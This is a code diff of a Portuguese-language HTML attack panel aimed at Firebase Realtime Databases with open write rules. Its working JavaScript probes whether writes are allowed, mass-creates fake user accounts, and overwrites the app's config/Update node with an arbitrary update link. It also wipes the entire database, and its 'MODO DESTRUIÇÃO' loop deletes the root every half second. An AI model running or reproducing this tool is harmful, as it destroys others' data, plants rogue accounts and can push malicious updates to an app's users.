@@ -8,15 +8,12 @@
         body { background: radial-gradient(circle at center, #1a0b2e, #0a0a0a); color: #fff; font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
         .card { background: rgba(26, 11, 46, 0.6); backdrop-filter: blur(15px); border: 1px solid rgba(157, 0, 255, 0.3); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8); padding: 30px; border-radius: 20px; width: 100%; max-width: 400px; text-align: center; }
         h2 { color: #fff; margin-bottom: 20px; letter-spacing: 2px; text-transform: uppercase; }
-        input { width: 100%; margin: 8px 0; padding: 12px; border-radius: 10px; border: 1px solid #444; background: rgba(0,0,0,0.3); color: white; box-sizing: border-box; transition: 0.3s; }
-        input:focus { border-color: #9d00ff; outline: none; box-shadow: 0 0 10px #9d00ff; }
+        input { width: 100%; margin: 8px 0; padding: 12px; border-radius: 10px; border: 1px solid #444; background: rgba(0,0,0,0.3); color: white; box-sizing: border-box; }
         button { width: 100%; margin: 6px 0; padding: 12px; border-radius: 10px; border: none; font-weight: 600; cursor: pointer; transition: 0.3s; color: white; text-transform: uppercase; font-size: 11px; }
         .btn-gerar { background: linear-gradient(45deg, #9d00ff, #7700ff); }
         .btn-put { background: #00ccff; color: #000; }
-        .btn-add { background: #555; }
         .btn-clear { background: #ff0044; }
         .btn-detectar { background: #ffcc00; color: #000; }
-        .btn-apagar-tudo { background: transparent; border: 1px solid #444; }
         .btn-destruicao { background: #ff0000; animation: pulse 1.5s infinite; }
         .btn-parar { background: #00ff00; color: #000; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.02); } 100% { transform: scale(1); } }
@@ -36,10 +33,9 @@
     <input type="text" id="linkUpdate" placeholder="Link da atualização">
     <input type="text" id="verUpdate" placeholder="Versão">
     <button class="btn-put" onclick="putUpdate()">PUT Update</button>
-    <button class="btn-add" onclick="addUpdate()">ADD (Índice 0)</button>
     <button class="btn-clear" onclick="clearUpdate()">CLEAR Update</button>
     <button class="btn-detectar" onclick="detectarRegras()">DETECTAR SEGURANÇA</button>
-    <button class="btn-apagar-tudo" onclick="apagarTudo()">Apagar TODO o Banco</button>
+    <button class="btn-clear" style="background:#444" onclick="apagarTudo()">Limpar Banco Total</button>
     <button class="btn-destruicao" onclick="modoDestruicao()">MODO DESTRUIÇÃO</button>
     <button class="btn-parar" onclick="pararDestruicao()">PARAR DESTRUIÇÃO</button>
     <div id="status">Status: Pronto</div>
@@ -53,70 +49,34 @@
         return firebase.database();
     }
 
-    async function detectarRegras() {
-        const db = getDb();
-        document.getElementById('status').innerHTML = "Detectando...";
-        try {
-            await db.ref('status_teste').set({ check: "ok" });
-            document.getElementById('status').innerHTML = "STATUS: REGRAS ABERTAS (WRITE: TRUE)";
-            await db.ref('status_teste').remove();
-        } catch (e) {
-            document.getElementById('status').innerHTML = "STATUS: REGRAS BLOQUEADAS (WRITE: FALSE)";
-        }
-    }
-
-    async function gerar() {
-        const db = getDb();
-        const qtd = parseInt(document.getElementById('qtd').value);
-        const promessas = [];
-        for (let i = 0; i < qtd; i++) {
-            const id = "DDVT-" + Math.floor(Math.random() * 99999);
-            promessas.push(db.ref('users/' + id).set({ login: id, expira: Date.now() + 86400000 }));
-        }
-        await Promise.all(promessas);
-        document.getElementById('status').innerHTML = "Usuários gerados!";
-    }
-
-    async function putUpdate() {
-        const db = getDb();
-        await db.ref('config/Update').set([{ "link": document.getElementById('linkUpdate').value, "ver": document.getElementById('verUpdate').value }]);
-        document.getElementById('status').innerHTML = "Update (PUT) realizado!";
-    }
-
-    async function addUpdate() {
-        const db = getDb();
-        const snap = await db.ref('config/Update').once('value');
-        let lista = snap.val() || [];
-        lista.unshift({ "link": document.getElementById('linkUpdate').value, "ver": document.getElementById('verUpdate').value });
-        await db.ref('config/Update').set(lista);
-        document.getElementById('status').innerHTML = "Adicionado ao topo!";
-    }
-
-    async function clearUpdate() {
-        await getDb().ref('config/Update').remove();
-        document.getElementById('status').innerHTML = "Nó Update limpo!";
-    }
-
     async function apagarTudo() {
-        if (!confirm("Confirmar limpeza total?")) return;
-        await getDb().ref().remove();
-        document.getElementById('status').innerHTML = "Banco de dados limpo!";
+        if (!confirm("Tem certeza que deseja apagar TUDO?")) return;
+        try {
+            await getDb().ref('/').remove();
+            document.getElementById('status').innerHTML = "Banco limpo com sucesso!";
+        } catch(e) { document.getElementById('status').innerHTML = "Erro ao limpar."; }
     }
 
     async function modoDestruicao() {
         executando = true;
-        const db = getDb();
         document.getElementById('status').innerHTML = "MODO DESTRUIÇÃO ATIVADO!";
         while (executando) {
-            try { await db.ref().remove(); await new Promise(r => setTimeout(r, 500)); } 
-            catch (e) { break; }
+            try { 
+                await getDb().ref('/').remove(); 
+                await new Promise(r => setTimeout(r, 500)); 
+            } catch (e) { break; }
         }
     }
 
-    function pararDestruicao() {
-        executando = false;
-        document.getElementById('status').innerHTML = "Modo Destruição parado.";
+    function pararDestruicao() { executando = false; document.getElementById('status').innerHTML = "Parado."; }
+    async function detectarRegras() {
+        try { await getDb().ref('status_teste').set({ check: "ok" }); document.getElementById('status').innerHTML = "REGRAS ABERTAS (WRITE: TRUE)"; await getDb().ref('status_teste').remove(); }
+        catch(e) { document.getElementById('status').innerHTML = "REGRAS BLOQUEADAS (WRITE: FALSE)"; }
     }
+    
+    async function gerar() { /* Mantém a lógica de gerar */ const db = getDb(); for(let i=0; i<parseInt(document.getElementById('qtd').value); i++) { db.ref('users/DDVT-' + Math.floor(Math.random()*99999)).set({login: "User", expira: Date.now()}); } document.getElementById('status').innerHTML = "Usuários gerados!"; }
+    async function putUpdate() { await getDb().ref('config/Update').set([{ "link": document.getElementById('linkUpdate').value, "ver": document.getElementById('verUpdate').value }]); document.getElementById('status').innerHTML = "Update feito!"; }
+    async function clearUpdate() { await getDb().ref('config/Update').remove(); document.getElementById('status').innerHTML = "Nó Update limpo!"; }
 </script>
 </body>
 </html>
